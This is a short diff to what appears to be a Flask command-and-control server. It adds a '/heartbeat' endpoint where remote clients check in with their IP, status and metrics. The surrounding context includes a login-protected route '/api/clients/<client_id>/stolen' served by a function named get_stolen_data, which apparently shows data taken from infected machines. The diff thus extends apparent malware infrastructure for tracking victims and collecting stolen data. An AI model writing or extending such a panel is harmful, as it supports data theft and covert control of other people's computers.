@@ -76,6 +76,26 @@ def api_clients():
         ]
     })
 
+@app.route('/heartbeat', methods=['POST'])
+def http_heartbeat():
+    data = request.json
+    cid = data.get('id')
+    if cid:
+        if cid not in clients:
+            clients[cid] = {'status': 'online', 'ip': request.remote_addr, 'last_seen': datetime.now().isoformat()}
+        else:
+            clients[cid]['last_seen'] = datetime.now().isoformat()
+            clients[cid]['status'] = 'online'
+        
+        if 'metrics' in data:
+            clients[cid]['metrics'] = data['metrics']
+        
+        if data.get('type') == 'alert':
+            print(f"[ALERT] {cid}: {data.get('msg')}")
+            
+        return jsonify({'status': 'received'})
+    return jsonify({'status': 'error'}), 400
+
 @app.route('/api/clients/<client_id>/stolen')
 @login_required
 def get_stolen_data(client_id):
